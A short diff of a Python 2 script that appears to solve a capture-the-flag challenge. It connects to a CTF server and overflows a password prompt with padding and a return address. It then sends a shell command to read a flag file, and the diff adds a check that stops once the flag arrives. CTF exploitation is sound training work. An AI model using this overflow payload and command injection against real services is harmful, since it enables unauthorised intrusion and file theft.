@@ -6,10 +6,13 @@ s.connect(("csie.ctf.tw", 10113))
 while 1 :
     data = s.recv(1024)
     print "RECV(", len(data), "): " + data
+
     if data == "Enter password: " :
         message = 'A' * 91 + "\0" + "\x89\x86\x04\x08" + "\n"
         print "SEND(", len(message), "): " + message
         s.sendall(message)
+    elif data[0:4] == "FLAG" :
+        break
     else :
         message = 'cat /home/vash/flag' + "\0" + "\n"
         print "SEND(", len(message), "): " + message
